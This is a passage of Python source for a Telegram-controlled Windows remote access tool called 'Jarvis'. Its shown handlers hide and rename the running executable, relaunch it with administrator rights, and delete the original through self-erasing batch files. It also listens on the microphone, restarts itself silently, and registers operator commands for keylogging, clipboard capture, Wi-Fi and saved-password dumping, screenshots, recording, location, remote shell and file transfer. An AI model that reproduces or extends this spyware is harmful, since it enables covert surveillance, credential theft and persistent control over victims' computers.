        if not getattr(sys, 'frozen', False):
            await update.message.reply_text("⚠️ /moveexe works only in compiled EXE mode.")
            return

        if len(context.args) < 1:
            await update.message.reply_text(
                "❌ Please provide the target folder. Usage:\n`/moveexe <path> [newname.exe]`",
                parse_mode="Markdown"
            )
            return

        dest_folder = context.args[0].strip('"').strip("'")
        dest_folder = os.path.abspath(dest_folder)  # Normalize to absolute path

        new_name = context.args[1] if len(context.args) > 1 else None

        if new_name and not new_name.lower().endswith('.exe'):
            await update.message.reply_text("❌ New EXE name must end with `.exe`.")
            return

        try:
            os.makedirs(dest_folder, exist_ok=True)
        except Exception as e:
            await update.message.reply_text(
                f"❌ Could not create/access folder:\n`{dest_folder}`\nError: {e}",
                parse_mode="Markdown"
            )
            return

        current_exe = sys.executable
        exe_name = os.path.basename(current_exe)

        target_exe_name = new_name if new_name else exe_name
        target_path = os.path.join(dest_folder, target_exe_name)

        if os.path.abspath(current_exe).lower() == os.path.abspath(target_path).lower():
            await update.message.reply_text("✅ Already running from the specified EXE path.")
            return

        shutil.copy(current_exe, target_path)

        os.system(f'attrib +h +s "{target_path}"')

        bat_path = os.path.join(tempfile.gettempdir(), "delete_old_jarvish.bat")
        with open(bat_path, "w") as f:
            f.write(f"""@echo off
timeout /t 1 >nul
del "{current_exe}" /f /q
del "%~f0" /f /q
""")

        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", target_path, None, None, 1)
        if ret <= 32:
            await update.message.reply_text(f"❌ Failed to launch with admin rights (error code {ret}).")
            return

        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

        await update.message.reply_text(f"✅ EXE moved, hidden, and restarted from:\n`{target_path}`", parse_mode="Markdown")

        os._exit(0)

    except Exception as e:
        await update.message.reply_text(f"❌ Move failed: {e}")

app.add_handler(CommandHandler("moveexe", restricted_handler(log_command(handle_moveexe))))
#--END--



#--RENAME--
import os
import sys
import ctypes
import tempfile
import subprocess
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

async def handle_changename(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not getattr(sys, 'frozen', False):
            await update.message.reply_text("⚠️ /changename works only in compiled EXE mode.")
            return

        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage:\n`/changename <newname.exe>`", parse_mode="Markdown")
            return

        new_name = context.args[0]
        if not new_name.lower().endswith('.exe'):
            await update.message.reply_text("❌ New name must end with `.exe`.")
            return

        current_path = sys.executable
        folder = os.path.dirname(current_path)
        new_path = os.path.join(folder, new_name)

        if os.path.abspath(current_path).lower() == os.path.abspath(new_path).lower():
            await update.message.reply_text("✅ Already running with this EXE name.")
            return

        # Copy the EXE to new name
        with open(current_path, 'rb') as src, open(new_path, 'wb') as dst:
            dst.write(src.read())

        # Optional: make new EXE hidden + system
        os.system(f'attrib +h +s "{new_path}"')

        # Create BAT file to delete old EXE after 1 sec delay
        bat_path = os.path.join(tempfile.gettempdir(), "rename_jarvish.bat")
        with open(bat_path, "w") as f:
            f.write(f"""@echo off
:waitloop
tasklist /fi "imagename eq {os.path.basename(current_path)}" | find /i "{os.path.basename(current_path)}" >nul
if not errorlevel 1 (
    timeout /t 1 /nobreak >nul
    goto waitloop
)
del "{current_path}" /f /q
del "%~f0" /f /q
""")


        # Launch new EXE as admin
        ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", new_path, None, None, 1)
        if ret <= 32:
            await update.message.reply_text(f"❌ Failed to launch new EXE with admin rights (error code {ret}).")
            return

        # Launch BAT to delete old EXE silently
        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)

        await update.message.reply_text(f"✅ EXE renamed and restarted as admin:\n`{new_path}`", parse_mode="Markdown")

        # Exit current process
        os._exit(0)

    except Exception as e:
        await update.message.reply_text(f"❌ Rename failed: {e}")

app.add_handler(CommandHandler("changename", restricted_handler(log_command(handle_changename))))
#--END--






#--VOICEDETECTION--
import asyncio
import queue
import threading
import sounddevice as sd
import numpy as np
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

voice_detection_running = False
voice_detection_thread = None

# Queue to send voice detection events to async bot loop
voice_event_queue = queue.Queue()

# Default parameters (will be overwritten by command args)
DURATION = 2  # seconds
THRESHOLD = 2  # sensitivity

def audio_callback(indata, frames, time, status):
    volume_norm = np.linalg.norm(indata)
    if volume_norm > THRESHOLD:
        voice_event_queue.put("voice_detected")

def voice_detection_loop():
    global voice_detection_running
    try:
        with sd.InputStream(callback=audio_callback, channels=1, samplerate=44100):
            while voice_detection_running:
                sd.sleep(int(DURATION * 1000))
    except Exception as e:
        print("[ERROR] Voice detection error:", e)

async def voice_event_handler(update: Update):
    while voice_detection_running:
        try:
            event = voice_event_queue.get_nowait()
        except queue.Empty:
            await asyncio.sleep(0.5)
            continue
        
        if event == "voice_detected":
            await update.message.reply_text("🗣️ Voice detected!")

async def voicedetection_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global voice_detection_running, voice_detection_thread, DURATION, THRESHOLD

    if voice_detection_running:
        await update.message.reply_text("🎙️ Voice detection already running.")
        return

    # Parse arguments from command
    if len(context.args) >= 2:
        try:
            DURATION = float(context.args[0])
            THRESHOLD = float(context.args[1])
        except ValueError:
            await update.message.reply_text("⚠️ Invalid arguments! Usage: /voicedetection <duration_in_seconds> <threshold>")
            return
    else:
        await update.message.reply_text("⚠️ Please provide duration and threshold. Usage: /voicedetection <duration_in_seconds> <threshold>")
        return

    voice_detection_running = True
    voice_detection_thread = threading.Thread(target=voice_detection_loop, daemon=True)
    voice_detection_thread.start()

    context.application.create_task(voice_event_handler(update))

    await update.message.reply_text(f"🎙️ Voice detection started with duration={DURATION}s and threshold={THRESHOLD}.")

async def stopvoicedetection_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global voice_detection_running, voice_detection_thread
    if not voice_detection_running:
        await update.message.reply_text("🎙️ Voice detection is not running.")
        return

    voice_detection_running = False
    if voice_detection_thread is not None:
        voice_detection_thread.join(timeout=2)
        voice_detection_thread = None

    await update.message.reply_text("🛑 Voice detection stopped.")


app.add_handler(CommandHandler("voicedetection", restricted_handler(log_command(voicedetection_command))))
app.add_handler(CommandHandler("stopvoicedetection", restricted_handler(log_command(stopvoicedetection_command))))
#--END--
















app.add_handler(CommandHandler("sniff", restricted_handler(log_command(handle_sniff_command))))
app.add_handler(CommandHandler("clearcmd", restricted_handler(log_command(clear_cmd_handler))))

app.add_handler(CommandHandler("startsmartalerts", restricted_handler(log_command(start_smart_alerts))))
app.add_handler(CommandHandler("stopalerts", restricted_handler(log_command(stop_smart_alerts))))
app.add_handler(CommandHandler("alertfile", restricted_handler(log_command(get_alert_file))))
app.add_handler(CommandHandler("deletealerts", restricted_handler(log_command(delete_alert_file))))
app.add_handler(CommandHandler("delete", restricted_handler(log_command(handle_delete))))
app.add_handler(CommandHandler("startclipboard", restricted_handler(log_command(handle_start_clipboard))))
app.add_handler(CommandHandler("stopclipboard", restricted_handler(log_command(handle_stop_clipboard))))
app.add_handler(CommandHandler("getclipboardlog", restricted_handler(log_command(handle_get_clipboard_log))))
app.add_handler(CommandHandler("deleteclipboardlog", restricted_handler(log_command(handle_delete_clipboard_log))))
app.add_handler(CommandHandler("killprocess", restricted_handler(log_command(kill_process))))
app.add_handler(CommandHandler("stopinputs", restricted_handler(log_command(handle_stop_inputs))))
app.add_handler(CommandHandler("screenlock", restricted_handler(log_command(screenlock))))
app.add_handler(CommandHandler("screenunlock", restricted_handler(log_command(screenunlock))))
app.add_handler(CommandHandler("installedapps", restricted_handler(log_command(list_installed_apps))))
app.add_handler(CommandHandler("shutdown", restricted_handler(log_command(handle_shutdown))))
app.add_handler(CommandHandler("cancelshutdown", restricted_handler(log_command(handle_cancel_shutdown))))
app.add_handler(CommandHandler("exitcmd", restricted_handler(log_command(handle_all_text))))
app.add_handler(CommandHandler("help", restricted_handler(log_command(help_handler))))
app.add_handler(CommandHandler("install", restricted_handler(log_command(install_package_handler))))
app.add_handler(CommandHandler("uninstall", restricted_handler(log_command(uninstall_package_handler))))
app.add_handler(CommandHandler("moduleslist", restricted_handler(log_command(modules_list_handler))))
app.add_handler(CommandHandler(["reboot", "restart"], restricted_handler(log_command(reboot_bot))))
app.add_handler(CommandHandler("screenshot", restricted_handler(log_command(take_screenshot))))
app.add_handler(CommandHandler("weather", restricted_handler(log_command(get_weather))))
app.add_handler(CommandHandler("location", restricted_handler(log_command(handle_location))))
app.add_handler(CommandHandler("systeminfo", restricted_handler(log_command(get_system_info))))
app.add_handler(CommandHandler("wikipedia", restricted_handler(log_command(search_wikipedia))))
app.add_handler(CommandHandler("record", restricted_handler(log_command(handle_record_command))))
app.add_handler(CommandHandler("createnote", restricted_handler(log_command(start_note_creation))))
app.add_handler(CommandHandler("time", restricted_handler(log_command(handle_time_command))))
app.add_handler(CommandHandler("web", restricted_handler(log_command(handle_open_web))))
app.add_handler(CommandHandler("closeweb", restricted_handler(log_command(handle_close_web))))
app.add_handler(CommandHandler("startkeylog", restricted_handler(log_command(start_keylogger))))
app.add_handler(CommandHandler("stopkeylog", restricted_handler(log_command(stop_keylogger))))
app.add_handler(CommandHandler("getkeylog", restricted_handler(log_command(send_keylog))))
app.add_handler(CommandHandler("deletelogs", restricted_handler(log_command(delete_keylog))))
app.add_handler(CommandHandler("getipinfo", restricted_handler(log_command(get_ip_info))))
app.add_handler(CommandHandler("opencmd", restricted_handler(log_command(open_cmd_handler))))

app.add_handler(CommandHandler("getlog", restricted_handler(log_command(send_log_file))))
app.add_handler(CommandHandler("deletelog", restricted_handler(log_command(delete_log_file))))
app.add_handler(CommandHandler("startlog", restricted_handler(log_command(start_logging))))
app.add_handler(CommandHandler("stoplog", restricted_handler(log_command(stop_logging))))

app.add_handler(CommandHandler("wifidump", restricted_handler(log_command(handle_wifi_passwords))))

app.add_handler(CommandHandler("removecode", restricted_handler(log_command(handle_removecode))))

app.add_handler(CommandHandler("speck", restricted_handler(log_command(handle_speck))))

app.add_handler(CommandHandler("getsavedpass", restricted_handler(log_command(handle_get_passwords))))

app.add_handler(CommandHandler("file", restricted_handler(log_command(list_files))))
app.add_handler(CommandHandler("push", restricted_handler(log_command(push_file))))
app.add_handler(CommandHandler("download", restricted_handler(log_command(download_file))))
app.add_handler(CommandHandler("move", restricted_handler(log_command(move_file))))







app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, restricted_handler(save_file)))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), restricted_handler(handle_all_text)))










#--AUTORESTART--
import logging
logging.disable(logging.CRITICAL)

def is_internet_available():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except:
        return False

def restart_script():
    try:
        import requests
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": OWNER_ID, "text": "🌐 Internet restored. Bot is restarting..."},
            timeout=5
        )
    except:
        pass  # Fully silent even if API fails

    os.execl(sys.executable, sys.executable, *sys.argv)

def internet_monitor():
    last_status = True
    while True:
        if is_internet_available():
            if not last_status:
                restart_script()
            last_status = True
        else:
            print("🔌 Internet disconnected.")
            last_status = False
        time.sleep(10)
#--END--





if __name__ == "__main__":
    if sys.platform.startswith('win') and sys.stdout is None:
        asyncio.set_event_loop(asyncio.new_event_loop())

    multiprocessing.freeze_support()

    logging.basicConfig(level=logging.INFO)
    logging.info("🤖 Jarvis is running... Waiting for your Telegram commands.")

    # Start internet monitor thread
    threading.Thread(target=internet_monitor, daemon=True).start()

    try:
        app.run_polling()
    except Exception as e:
        logging.error("❌ App crashed with exception", exc_info=True)



